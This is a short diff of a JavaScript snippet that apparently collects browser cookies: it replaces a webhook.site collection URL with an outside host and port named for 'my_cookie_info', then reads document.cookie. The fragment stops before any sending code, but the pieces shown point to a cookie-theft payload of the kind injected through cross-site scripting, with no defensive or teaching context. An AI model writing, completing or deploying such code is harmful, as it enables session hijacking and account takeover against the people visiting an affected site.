@@ -1,5 +1,5 @@
 (function() {
-    const webhookUrl = 'https://webhook.site/dde0021c-614f-4dc0-b6fc-25294beae606';
+    const webhookUrl = 'http://sflee.kro.kr:5555/api/v1/my_cookie_info';
 
     const cookies = document.cookie;
 
